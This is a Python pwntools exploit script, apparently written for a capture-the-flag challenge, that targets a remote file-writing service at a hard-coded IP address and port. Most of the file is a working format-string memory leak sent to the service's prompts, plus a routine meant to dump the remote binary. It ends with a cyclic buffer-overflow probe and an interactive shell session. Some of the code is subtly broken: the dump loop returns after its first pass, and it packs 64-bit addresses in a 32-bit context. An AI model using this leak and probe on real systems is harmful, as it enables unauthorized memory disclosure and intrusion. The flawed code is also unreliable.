#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
host = "54.161.125.246"
port = 1003

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
@MemLeak
@MemLeak.NoNewlines
@MemLeak.String
def leak(addr):
    old_level = context.log_level
    context.log_level = 'error'
    r = remote(host, port)
    context.log_level = old_level
    r.recvuntil('* File Name?\n', drop=True)
    r.sendline('%13$s|||' + '%c'*16  + p64(addr))
    r.recvuntil('* Mode?\n', drop=True)
    r.sendline('%13$s|||' + '%c'*16  + p64(addr))
    r.recvuntil('* Content?\n', drop=True)
    r.sendline('%13$s|||' + '%c'*16  + p64(addr))
    old_level = context.log_level
    context.log_level = 'debug'
    a = r.recvuntil('|||', drop=True)
    log.debug('leaked {} => {}'.format(hex(addr), repr(a)))
    context.log_level = 'error'
    r.close()
    context.log_level = old_level
    return a

def dump_binary(addr, length = 0x10000):
    current = addr
    dumped = ''
    while current < addr + length:
        s = leak(current)
        if s == None:
            dumped += '\x00'
            current += 1
            continue
        else:
            dumped += s
            current += len(s)
        return dumped

def save_file(filename, content):
    print 'generating %s.. [size: %d]' % (filename, len(content))
    f = open(filename, 'w')
    f.write(content)
    f.close()

'''
binary = dump_binary(0x10000, 0x5dae0)
save_file('binary', binary)
'''

io = remote(host, port)
io.recvuntil("* File Name?\n")
io.sendline()
io.recvuntil("* Mode?\n")
io.sendline()
io.recvuntil("* Content?")
#io.send("%c"*7 + "AAAAAAAA" + ".%p"*50)
io.send(cyclic(500))
print io.recv()
io.interactive()

